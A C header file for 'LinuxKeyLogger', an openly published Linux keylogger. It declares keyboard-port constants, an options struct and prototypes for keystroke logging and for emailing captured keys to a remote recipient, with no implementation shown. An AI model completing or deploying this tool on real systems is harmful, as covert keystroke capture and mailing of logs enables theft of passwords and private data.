/*
    LinuxKeyLogger, lkl is a keylogger for x86-arch running under linux.
    Developed by vl4d

    Copyright (C) 2003  Carlo Comin

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <sys/io.h>
#include <syslog.h>
#include <string.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define TABLE_SIZE 128
#define SYSLOGOUT 0xFF
#define MSEC 1
#define ANTIPAIR 127
#define KEYBOARD_PORT 0x60
#define KEYBOARD_STATUS_PORT 0x64

#define BOLD "\033[1m"
#define NORMAL "\033[0m"

struct lkl{
	char *outfile, *km_file;
	char *host, *mailbuf, *rcpt, *mailargs;		//snd_mail email args
	char akeycode[128];
	int port, log, syslog, debug, mail;    		//lkl features options
	int pressed_shift, pressed_alt;  		//to choose correct keymap
};

void do_output(char c, struct lkl *lkl);
void start_log(struct lkl *lkl);
void def_keymap(char km_file[]);
void snd_mail(char ascii[], char host[], char rcpt[]);
void usage();
char *code2ascii(char c, struct lkl *lkl);
